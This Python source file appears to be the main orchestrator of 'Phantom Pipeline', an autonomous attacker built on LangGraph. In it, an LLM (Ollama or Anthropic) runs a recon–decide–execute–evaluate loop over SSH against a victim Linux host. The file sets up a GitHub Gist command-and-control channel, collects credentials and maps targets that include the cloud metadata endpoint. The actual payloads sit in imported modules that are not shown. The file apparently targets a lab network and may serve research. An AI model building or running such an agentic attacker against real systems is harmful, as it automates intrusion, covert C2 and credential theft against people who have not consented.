"""
Phantom Pipeline — Agentic Attacker Engine

LangGraph orchestrator that autonomously executes an attack chain
against a victim Linux host. Inspired by the HuggingFace July 2026 incident.

Usage:
    python -m attacker.agent_graph
    python -m attacker.agent_graph --config config.yaml --target 10.4.60.40
"""

import argparse
import os
import queue
import time
import uuid
from typing import Annotated, Optional

import yaml
from langgraph.graph import END, START, StateGraph
from typing_extensions import TypedDict

from attacker.c2.gist_c2 import GistC2
from attacker.c2.victim_shell import VictimShell
from attacker.nodes.decision_node import decision_node
from attacker.nodes.eval_node import eval_node
from attacker.nodes.exec_node import exec_node
from attacker.nodes.recon_node import recon_node


class AttackerState(TypedDict):
    # Identity
    session_id: str
    target_ip: str
    victim2_ip: str

    # Infrastructure (not serialized — runtime objects)
    shell: object          # VictimShell
    llm: object            # LangChain LLM
    c2: object             # GistC2
    event_queue: object    # queue.Queue for SSE

    # Attack state
    recon_output: str
    available_vectors: list
    current_technique: str
    current_commands: list
    exec_results: list
    credentials_found: dict
    decision_log: list
    objective_reached: bool


def _should_continue(state: AttackerState) -> str:
    """Edge function: continue loop or end."""
    if state.get("objective_reached"):
        return END
    if not state.get("available_vectors"):
        return END
    return "decision_node"


def build_graph() -> StateGraph:
    g = StateGraph(AttackerState)

    g.add_node("recon_node", recon_node)
    g.add_node("decision_node", decision_node)
    g.add_node("exec_node", exec_node)
    g.add_node("eval_node", eval_node)

    g.add_edge(START, "recon_node")
    g.add_edge("recon_node", "decision_node")
    g.add_edge("decision_node", "exec_node")
    g.add_edge("exec_node", "eval_node")
    g.add_conditional_edges("eval_node", _should_continue)

    return g.compile()


def load_config(path: str = "config.yaml") -> dict:
    with open(path) as f:
        return yaml.safe_load(f)


def build_llm(cfg: dict):
    provider = cfg["llm"]["provider"]
    model = cfg["llm"]["model"]

    if provider == "ollama":
        from langchain_ollama import ChatOllama
        return ChatOllama(
            model=model,
            base_url=cfg["llm"].get("base_url", "http://localhost:11434"),
            temperature=0,
        )
    elif provider == "anthropic":
        from langchain_anthropic import ChatAnthropic
        return ChatAnthropic(
            model=model,
            api_key=cfg["llm"].get("api_key"),
            temperature=0,
        )
    else:
        raise ValueError(f"Unknown LLM provider: {provider}")


def run(
    config_path: str = "config.yaml",
    target_ip: Optional[str] = None,
    event_queue: Optional[queue.Queue] = None,
) -> dict:
    """
    Run the agentic attacker against target.
    Returns final state dict with credentials_found and decision_log.
    """
    cfg = load_config(config_path)
    lab = cfg["lab"]
    target = target_ip or lab["victim_ip"]
    session_id = str(uuid.uuid4())[:8]

    print(f"\n{'='*60}")
    print(f"  PHANTOM PIPELINE — Session {session_id}")
    print(f"  Target: {target}")
    print(f"  LLM: {cfg['llm']['provider']}/{cfg['llm']['model']}")
    print(f"{'='*60}\n")

    # Build infrastructure objects
    key_path = lab.get("victim_ssh_key") or None
    if key_path:
        key_path = os.path.expanduser(key_path)
    shell = VictimShell(
        host=target,
        user=lab.get("victim_user", "ubuntu"),
        key_path=key_path,
        password=lab.get("victim_password") or None,
    )
    shell.connect()

    llm = build_llm(cfg)

    c2 = None
    github_token = cfg.get("c2", {}).get("github_token", "")
    if github_token and github_token != "ghp_XXXX":
        c2 = GistC2(token=github_token)
        print(f"[Main] C2 channel enabled (GitHub Gist)")
    else:
        print(f"[Main] C2 channel disabled (no github_token configured)")

    # Initial state
    initial_state = AttackerState(
        session_id=session_id,
        target_ip=target,
        victim2_ip=lab.get("victim2_ip", "10.4.60.41"),
        shell=shell,
        llm=llm,
        c2=c2,
        event_queue=event_queue,
        recon_output="",
        available_vectors=[],
        current_technique="",
        current_commands=[],
        exec_results=[],
        credentials_found={},
        decision_log=[],
        objective_reached=False,
    )

    # Emit start event
    if event_queue:
        event_queue.put({
            "type": "session_start",
            "session_id": session_id,
            "target_ip": target,
            "ts": time.time(),
        })
        # Emit initial network topology
        event_queue.put({
            "type": "topology_init",
            "nodes": [
                {"id": "attacker", "label": "Attacker C2", "ip": lab.get("attacker_ip", "10.4.60.21"), "state": "active"},
                {"id": "victim1", "label": "Victim (AWS)", "ip": target, "state": "clean"},
                {"id": "victim2", "label": "Unmanaged", "ip": lab.get("victim2_ip", "10.4.60.41"), "state": "clean"},
                {"id": "gist", "label": "GitHub Gist C2", "ip": "api.github.com", "state": "external"},
                {"id": "aws", "label": "AWS Metadata", "ip": "169.254.169.254", "state": "unknown"},
                {"id": "cloud", "label": "Cloud API", "ip": "aws/gcp", "state": "unknown"},
            ],
        })

    graph = build_graph()

    try:
        final_state = graph.invoke(initial_state)
    finally:
        shell.disconnect()
        if c2 and c2.gist_id:
            c2.delete_channel()
            print(f"[Main] C2 channel cleaned up")

    # Print summary
    print(f"\n{'='*60}")
    print(f"  SESSION COMPLETE — {session_id}")
    print(f"  Steps executed: {len(final_state['exec_results'])}")
    print(f"  Credentials found: {list(final_state['credentials_found'].keys())}")
    print(f"  Decisions made: {len(final_state['decision_log'])}")
    print(f"{'='*60}\n")

    if event_queue:
        event_queue.put({
            "type": "session_complete",
            "session_id": session_id,
            "steps": len(final_state["exec_results"]),
            "credentials": list(final_state["credentials_found"].keys()),
        })

    return final_state


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phantom Pipeline — Agentic Attacker")
    parser.add_argument("--config", default="config.yaml")
    parser.add_argument("--target", help="Override target IP from config")
    args = parser.parse_args()

    run(config_path=args.config, target_ip=args.target)
